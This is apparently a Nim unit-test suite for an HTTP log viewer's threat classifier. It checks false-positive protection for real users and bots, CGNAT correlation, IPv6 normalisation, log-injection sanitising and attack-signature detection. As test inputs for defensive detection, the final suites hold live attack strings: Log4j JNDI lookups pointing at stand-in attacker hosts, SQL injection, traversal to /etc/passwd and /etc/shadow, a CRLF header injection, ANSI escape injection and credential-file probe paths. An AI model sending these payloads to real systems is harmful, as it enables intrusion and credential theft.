## Test suite for Phase 08 / Category C: Threat Detection Accuracy & False Positive Auditing.
## Tests Items 01 through 06:
## - Item 01: Legitimate web traffic audit (real users, search engines, friendly crawlers)
## - Item 02: Accidental 404 and broken link protection
## - Item 03: Multi-IP correlation and CGNAT / corporate proxy protection
## - Item 04: IPv6 parsing edge cases and RFC 5952 canonical normalization
## - Item 05: Resilience against adversarial log injection (ANSI, control chars, null bytes)
## - Item 06: Case-insensitive and normalized attack signatures

import std/[unittest, options, times, sets, tables, strutils]
import http_logviewer
import http_logviewer/core/types
import http_logviewer/enrichment/bogon
import http_logviewer/analyzer/[classifier, signatures, useragents, correlator]
import http_logviewer/parser/formats
import http_logviewer/renderer/[terminal, styles]

suite "Threat Detection Accuracy - Legitimate Traffic & Verified Bot Protection (Phase 08 / Category C / Item 01)":

  test "Item 01: Standard human browser visits never flagged as hackers":
    let uas = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
      "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
    ]
    let legitimatePaths = [
      "/",
      "/index.html",
      "/about",
      "/contact",
      "/pricing",
      "/products?category=electronics&sort=asc&page=2",
      "/search?q=machine+learning+tutorial",
      "/api/v1/users/profile",
      "/docs/getting-started",
      "/blog/how-to-optimize-nim-programs"
    ]

    for ua in uas:
      for p in legitimatePaths:
        let entry = initHttpLogEntry(
          clientIp = "93.184.216.34",
          timestamp = now(),
          `method` = HttpGet,
          path = p,
          statusCode = 200,
          bytesSent = 4096,
          referer = "https://example.com/",
          userAgent = ua
        )
        let threat = analyzeEntry(entry)
        check threat.score <= 20
        check threat.category == CategoryRealUser
        check threat.flags.len == 0

  test "Item 01: Human browsing flow with static assets receives mitigating bonus":
    let tracker = newVisitorBehaviorTracker()
    let ip = "198.51.100.42"
    let baseTime = parse("2026-09-05T01:00:00Z", "yyyy-MM-dd'T'HH:mm:sszzz")

    let browserUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
    # 1. First request: HTML page
    let e1 = initHttpLogEntry(clientIp = ip, timestamp = baseTime, `method` = HttpGet, path = "/dashboard", statusCode = 200, userAgent = browserUa)
    discard tracker.recordEntry(e1)

    # 2. Browser automatically requests CSS, JS, images, fonts
    let assets = ["/css/app.css", "/js/main.js", "/images/hero.webp", "/fonts/inter.woff2", "/favicon.ico"]
    for i, a in assets:
      let ea = initHttpLogEntry(
        clientIp = ip,
        timestamp = baseTime + initDuration(seconds = i + 1),
        `method` = HttpGet,
        path = a,
        statusCode = 200,
        referer = "https://example.com/dashboard",
        userAgent = browserUa
      )
      discard tracker.recordEntry(ea)

    let stats = tracker.getStats(ip)
    check stats.isSome
    check stats.get().staticAssetRatio() > 0.50

    # 3. Next page visit: human behavior bonus applied
    let e2 = initHttpLogEntry(
      clientIp = ip,
      timestamp = baseTime + initDuration(seconds = 10),
      `method` = HttpGet,
      path = "/settings",
      statusCode = 200,
      userAgent = browserUa
    )
    let threat = evaluateThreat(e2, tracker)
    check threat.score == 0
    check threat.category == CategoryRealUser

  test "Item 01: Verified search engine bots are never flagged as hackers":
    let searchBots = [
      ("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Googlebot", "66.249.66.1"),
      ("Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", "Bingbot", "40.77.167.1"),
      ("DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)", "DuckDuckBot", "54.208.102.37"),
      ("Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)", "YandexBot", "178.154.160.1"),
      ("Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)", "Baiduspider", "180.76.15.1"),
      ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)", "Applebot", "17.58.101.1")
    ]

    for (ua, expectedName, botIp) in searchBots:
      let entry = initHttpLogEntry(
        clientIp = botIp,
        timestamp = now(),
        `method` = HttpGet,
        path = "/articles/deep-learning-systems",
        statusCode = 200,
        bytesSent = 15200,
        userAgent = ua
      )
      let threat = analyzeEntry(entry)
      check threat.score == 0
      check threat.category == CategoryVerifiedBot
      check expectedName.toLowerAscii() in threat.matchedSignatures[0].toLowerAscii()

  test "Item 01: Friendly social and archivist crawlers are correctly categorized":
    let friendlyBots = [
      ("Twitterbot/1.0", CategoryFriendlyCrawler),
      ("Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)", CategoryFriendlyCrawler),
      ("LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)", CategoryFriendlyCrawler),
      ("facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)", CategoryFriendlyCrawler),
      ("ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)", CategoryFriendlyCrawler)
    ]

    for (ua, expectedCategory) in friendlyBots:
      let entry = initHttpLogEntry(
        clientIp = "199.16.156.125",
        timestamp = now(),
        `method` = HttpGet,
        path = "/posts/announcement",
        statusCode = 200,
        userAgent = ua
      )
      let threat = analyzeEntry(entry)
      check threat.score == 0
      check threat.category == expectedCategory

  test "Item 01: Commercial SEO crawlers categorized as CategoryCommercialBot":
    let commercialBots = [
      "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
      "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
      "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
    ]

    for ua in commercialBots:
      let entry = initHttpLogEntry(
        clientIp = "54.36.148.10",
        timestamp = now(),
        `method` = HttpGet,
        path = "/catalog",
        statusCode = 200,
        userAgent = ua
      )
      let threat = analyzeEntry(entry)
      check threat.score <= 20
      check threat.category == CategoryCommercialBot

suite "Threat Detection Accuracy - Accidental 404 & Broken Link Protection (Phase 08 / Category C / Item 02)":

  test "Item 02: Single accidental 404 on broken page link stays within RealUser":
    let entry = initHttpLogEntry(
      clientIp = "203.0.113.15",
      timestamp = now(),
      `method` = HttpGet,
      path = "/blog/old-broken-link-2019",
      statusCode = 404,
      bytesSent = 162,
      referer = "https://example.com/blog",
      userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"
    )
    let threat = analyzeEntry(entry)
    check threat.score == 5
    check threat.score <= 20
    check threat.category == CategoryRealUser
    check "404:SinglePageNotFound" in threat.matchedSignatures

  test "Item 02: 404 on missing static asset scores 0 points":
    let missingAssets = [
      "/favicon.ico",
      "/images/old-logo.png",
      "/css/custom-theme.css",
      "/js/analytics.js",
      "/fonts/glyphicons.woff2"
    ]
    for assetPath in missingAssets:
      let entry = initHttpLogEntry(
        clientIp = "203.0.113.16",
        timestamp = now(),
        `method` = HttpGet,
        path = assetPath,
        statusCode = 404,
        bytesSent = 162,
        userAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
      )
      let threat = analyzeEntry(entry)
      check threat.score == 0
      check threat.category == CategoryRealUser

  test "Item 02: Verified bot encountering 404 remains verified bot with 0 score":
    let entry = initHttpLogEntry(
      clientIp = "66.249.66.2",
      timestamp = now(),
      `method` = HttpGet,
      path = "/products/discontinued-item-44",
      statusCode = 404,
      bytesSent = 230,
      userAgent = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    let threat = analyzeEntry(entry)
    check threat.score == 0
    check threat.category == CategoryVerifiedBot

  test "Item 02: Contrast with intentional dictionary fuzzing (rapid 404 streak) escalating to hacker":
    let tracker = newVisitorBehaviorTracker()
    let ip = "198.51.100.99"
    let baseTime = parse("2026-09-05T01:00:00Z", "yyyy-MM-dd'T'HH:mm:sszzz")

    # Scanner executes 10 rapid 404s on administrative/hidden endpoints
    let probes = [
      "/admin", "/administrator", "/wp-admin", "/cpanel", "/webadmin",
      "/login.php", "/actuator/env", "/telescope", "/pma", "/phpmyadmin"
    ]
    var finalThreat: ThreatProfile
    for i, p in probes:
      let e = initHttpLogEntry(
        clientIp = ip,
        timestamp = baseTime + initDuration(seconds = i * 2),
        `method` = HttpGet,
        path = p,
        statusCode = 404,
        userAgent = "curl/7.68.0"
      )
      finalThreat = evaluateThreat(e, tracker)

    check finalThreat.score >= 50
    check finalThreat.category == CategoryBadActorHacker
    check ThreatHighRate404 in finalThreat.flags

suite "Threat Detection Accuracy - Multi-IP Correlation & CGNAT / Proxy Protection (Phase 08 / Category C / Item 03)":

  test "Item 03: Distinct innocent users sharing CGNAT IP (100.64.0.0/10) are never correlated":
    let table = newActorClusterTable(windowSeconds = 300)
    let cgnatIp = "100.64.1.55"
    let t = now()

    # User A requests homepage
    let entryA = initHttpLogEntry(
      clientIp = cgnatIp,
      timestamp = t,
      `method` = HttpGet,
      path = "/home",
      statusCode = 200,
      userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0"
    )
    let threatA = analyzeEntry(entryA)
    let clusterA = table.correlateRecord(entryA, threatA)
    check clusterA.isNone # Innocent user never creates or joins cluster

    # User B behind the same CGNAT gateway requests documentation
    let entryB = initHttpLogEntry(
      clientIp = cgnatIp,
      timestamp = t + initDuration(seconds = 5),
      `method` = HttpGet,
      path = "/docs/faq",
      statusCode = 200,
      userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) Safari/604.1"
    )
    let threatB = analyzeEntry(entryB)
    let clusterB = table.correlateRecord(entryB, threatB)
    check clusterB.isNone
    check table.clusters.len == 0

  test "Item 03: Separate innocent users in private RFC 1918 subnets are never subnet-clustered":
    let table = newActorClusterTable(windowSeconds = 300)
    let t = now()

    let browserUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0"
    # Client 1 in 192.168.1.0/24
    let e1 = initHttpLogEntry(clientIp = "192.168.1.10", timestamp = t, `method` = HttpGet, path = "/api/v1/status", statusCode = 200, userAgent = browserUa)
    let t1 = analyzeEntry(e1)
    check table.correlateRecord(e1, t1).isNone

    # Client 2 in same subnet
    let e2 = initHttpLogEntry(clientIp = "192.168.1.20", timestamp = t + initDuration(seconds = 2), `method` = HttpGet, path = "/profile", statusCode = 200, userAgent = browserUa)
    let t2 = analyzeEntry(e2)
    check table.correlateRecord(e2, t2).isNone

    check table.clusters.len == 0

  test "Item 03: Malicious probe in CGNAT range does not contaminate benign CGNAT user":
    let table = newActorClusterTable(windowSeconds = 300)
    let t = now()

    # Attacker behind CGNAT probes sensitive file
    let badEntry = initHttpLogEntry(
      clientIp = "100.64.2.100",
      timestamp = t,
      `method` = HttpGet,
      path = "/.env",
      statusCode = 404,
      userAgent = "curl/8.0.1"
    )
    let badThreat = analyzeEntry(badEntry)
    check badThreat.category == CategoryBadActorHacker
    let badClusterId = table.correlateRecord(badEntry, badThreat)
    check badClusterId.isSome

    # Innocent neighbor behind same CGNAT subnet requests normal page
    let goodEntry = initHttpLogEntry(
      clientIp = "100.64.2.105",
      timestamp = t + initDuration(seconds = 3),
      `method` = HttpGet,
      path = "/products",
      statusCode = 200,
      userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    )
    let goodThreat = analyzeEntry(goodEntry)
    let goodClusterId = table.correlateRecord(goodEntry, goodThreat)
    check goodClusterId.isNone

    # Verify cluster contains only the attacker's IP
    let cluster = table.getCluster(badClusterId.get())
    check cluster.isSome
    check cluster.get().ips.len == 1
    check "100.64.2.100" in cluster.get().ips
    check "100.64.2.105" notin cluster.get().ips

suite "Threat Detection Accuracy - IPv6 Parsing & RFC 5952 Normalization (Phase 08 / Category C / Item 04)":

  test "Item 04: formatIpv6Canonical produces canonical RFC 5952 format":
    # 1. Standard compression of zeros
    var bytes1: array[16, byte]
    # 2001:0db8:0000:0000:0000:ff00:0042:8329
    check parseIpv6ToBytes("2001:0db8:0000:0000:0000:ff00:0042:8329", bytes1)
    check formatIpv6Canonical(bytes1) == "2001:db8::ff00:42:8329"

    # 2. Loopback ::1
    var bytes2: array[16, byte]
    check parseIpv6ToBytes("0:0:0:0:0:0:0:1", bytes2)
    check formatIpv6Canonical(bytes2) == "::1"

    # 3. Unspecified ::
    var bytes3: array[16, byte]
    check parseIpv6ToBytes("0:0:0:0:0:0:0:0", bytes3)
    check formatIpv6Canonical(bytes3) == "::"

    # 4. Tie break: first zero run compressed (RFC 5952 Sec 4.2.3)
    var bytes4: array[16, byte]
    check parseIpv6ToBytes("2001:db8:0:0:1:0:0:1", bytes4)
    check formatIpv6Canonical(bytes4) == "2001:db8::1:0:0:1"

    # 5. Single zero group must not be compressed (RFC 5952 Sec 4.2.2)
    var bytes5: array[16, byte]
    check parseIpv6ToBytes("2001:db8:0:1:1:1:1:1", bytes5)
    check formatIpv6Canonical(bytes5) == "2001:db8:0:1:1:1:1:1"

    # 6. IPv4-mapped IPv6 address (RFC 5952 Sec 4.2.4)
    var bytes6: array[16, byte]
    check parseIpv6ToBytes("::ffff:192.0.2.128", bytes6)
    check formatIpv6Canonical(bytes6) == "::ffff:192.0.2.128"

  test "Item 04: normalizeIpAddress and normalizeIpv6Address handle bracketed and port edge cases":
    check normalizeIpAddress("192.168.1.1:8080") == "192.168.1.1"
    check normalizeIpAddress("  [2001:db8::1]:443  ") == "2001:db8::1"
    check normalizeIpAddress("[::1]:80") == "::1"
    check normalizeIpAddress("[fe80::1%eth0]:80") == "fe80::1"
    check normalizeIpv6Address("2001:0DB8:0000:0000:0000:0000:1428:57AB") == "2001:db8::1428:57ab"

  test "Item 04: Malformed IPv6 inputs rejected safely":
    var dummy: array[16, byte]
    check not parseIpv6ToBytes("2001::db8::1", dummy)       # Multiple ::
    check not parseIpv6ToBytes("1:2:3:4:5:6:7:8:9", dummy)   # 9 words
    check not parseIpv6ToBytes("2001:xyz::1", dummy)         # Non-hex
    check not parseIpv6ToBytes("10000::1", dummy)            # Word > 0xFFFF
    check not parseIpv6ToBytes("", dummy)                    # Empty

suite "Threat Detection Accuracy - Adversarial Log Injection Resilience (Phase 08 / Category C / Item 05)":

  test "Item 05: ANSI screen clear and color sequences are sanitized in parser and renderer":
    let maliciousUa = "Mozilla/5.0 \x1b[2J\x1b[H\x1b[31;1mPWNED\x1b[0m"
    let sanitized = sanitizeField(maliciousUa)
    check "\x1b" notin sanitized
    check "\\e[2J" in sanitized
    check "\\e[31;1m" in sanitized

    # Verify renderer emits no raw 0x1B byte
    let entry = initHttpLogEntry(
      clientIp = "192.0.2.1",
      timestamp = now(),
      `method` = HttpGet,
      path = "/index.html",
      statusCode = 200,
      userAgent = maliciousUa
    )
    let rec = EnrichedLogRecord(
      entry: entry,
      geo: GeoLocation(countryCode: "US", flagEmoji: "🇺🇸"),
      threat: ThreatProfile(score: 0, category: CategoryRealUser)
    )
    let rendered = renderStreamLine(rec, defaultStreamFormatOptions())
    check "PWNED" in rendered
    # Renderer should have converted escape to safe text \e
    check "\x1b[2J" notin rendered

  test "Item 05: Carriage return and newline injection prevented":
    let crlfPath = "/index.html\r\nHost: evil.com\r\n\r\n"
    let safePath = sanitizeField(crlfPath)
    check "\r" notin safePath
    check "\n" notin safePath
    check "\\r\\n" in safePath

  test "Item 05: Null byte injection does not truncate strings or crash handlers":
    let nullByteUri = "/download/report.pdf\0.php"
    let safeUri = sanitizeField(nullByteUri)
    check "\0" notin safeUri
    check "\\0" in safeUri
    check safeUri.len >= nullByteUri.len

suite "Threat Detection Accuracy - Case-Insensitive & Normalized Attack Signatures (Phase 08 / Category C / Item 06)":

  test "Item 06: Sensitive file probes detected across upper and mixed cases":
    let variations = [
      "/.ENV",
      "/.Env.Local",
      "/.Git/Config",
      "/WP-CONFIG.PHP",
      "/ID_RSA",
      "/.Aws/Credentials",
      "/DoCkEr-CoMpOsE.YmL",
      "/AcTuAtOr/EnV",
      "/PhPiNfO.pHp"
    ]
    for v in variations:
      let detected = detectSensitiveFileProbe(v)
      check detected.isSome
      let threat = analyzeEntry(initHttpLogEntry(path = v))
      check ThreatSensitiveFile in threat.flags
      check threat.score >= 50
      check threat.category == CategoryBadActorHacker

  test "Item 06: CMS exploits detected across upper, mixed cases, and percent encoding":
    let cmsVariations = [
      "/Wp-LoGiN.PhP",
      "/WP-ADMIN/",
      "/XmLrPc.PhP",
      "/PhpMyAdmin/",
      "/PMA/",
      "/%57%70%2d%4c%6f%67%69%6e%2e%70%68%70" # /Wp-Login.php encoded
    ]
    for v in cmsVariations:
      let detected = detectCmsExploit(v)
      check detected.isSome
      let threat = analyzeEntry(initHttpLogEntry(path = v))
      check ThreatCmsExploit in threat.flags
      check threat.score >= 21

  test "Item 06: SQL injection detected across mixed cases and encodings":
    let sqliVariations = [
      "/items?id=1+UnIoN+SeLeCt+null,password+from+users",
      "/catalog?search=test%27%20OR%20%271%27=%271",
      "/users?id=1%20UNION%20SELECT%201,2,3",
      "/query?term=books%27+or+1=1--"
    ]
    for v in sqliVariations:
      let detected = detectSqlInjection(v)
      check detected.isSome
      let threat = analyzeEntry(initHttpLogEntry(path = v))
      check ThreatSqlInjection in threat.flags
      check threat.score >= 50
      check threat.category == CategoryBadActorHacker

  test "Item 06: Directory traversal detected across backslashes and multi-pass encoding":
    let travVariations = [
      "..\\..\\windows\\system32\\cmd.exe",
      "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fshadow",
      "/static/images/../../../etc/passwd"
    ]
    for v in travVariations:
      let detected = detectDirectoryTraversal(v)
      check detected.isSome
      let threat = analyzeEntry(initHttpLogEntry(path = v))
      check ThreatDirectoryTraversal in threat.flags
      check threat.score >= 50
      check threat.category == CategoryBadActorHacker

  test "Item 06: Log4j / JNDI probes detected across mixed cases and obfuscation":
    let jndiVariations = [
      "${jNdI:LdAp://attacker.com/exploit}",
      "${JNDI:RMI://bad.host:1099/obj}",
      "${jndi:dns://listener.threat.com/a}"
    ]
    for v in jndiVariations:
      let detected = detectLog4jJndi(v)
      check detected.isSome
      let threat = analyzeEntry(initHttpLogEntry(path = v))
      check ThreatCommandInjection in threat.flags
      check threat.score >= 50
